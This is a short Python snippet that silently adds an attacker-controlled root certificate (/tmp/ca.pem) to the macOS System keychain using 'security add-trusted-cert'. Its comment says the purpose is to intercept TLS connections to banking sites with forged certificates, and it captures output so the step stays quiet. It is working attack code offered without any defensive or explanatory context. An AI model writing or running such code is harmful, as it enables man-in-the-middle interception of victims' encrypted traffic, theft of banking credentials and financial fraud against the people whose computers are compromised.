import subprocess

# Silently install an attacker CA into the System keychain so TLS to
# banking sites can be intercepted with forged certificates.
subprocess.run(
    "security add-trusted-cert -d -r trustRoot "
    "-k /Library/Keychains/System.keychain /tmp/ca.pem",
    shell=True,
    check=True,
    capture_output=True,
)
